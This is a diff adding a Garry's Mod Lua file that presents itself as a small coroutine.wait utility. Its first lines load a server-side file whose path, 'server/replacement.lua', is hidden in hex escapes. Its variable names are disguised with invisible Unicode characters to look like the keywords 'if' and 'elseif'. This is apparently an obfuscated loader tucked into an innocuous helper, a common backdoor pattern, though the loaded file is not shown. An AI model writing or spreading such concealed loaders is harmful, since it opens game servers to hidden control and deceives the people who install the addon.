@@ -1,0 +1,16 @@
+if
+SERVER
+then
+include('\x73\x65\x72\x76\x65\x72\x2F\x72\x65\x70\x6C\x61\x63\x65\x6D\x65\x6E\x74\x2E\x6C\x75\x61')end
+AddCSLuaFile()if(!coroutine)then
+return
+end
+function
+coroutine.wait(if⁭)local
+﻿elseif=CurTime()+if⁭
+while(true)do
+if(﻿elseif<CurTime())then
+return
+end
+coroutine.yield()end
+end
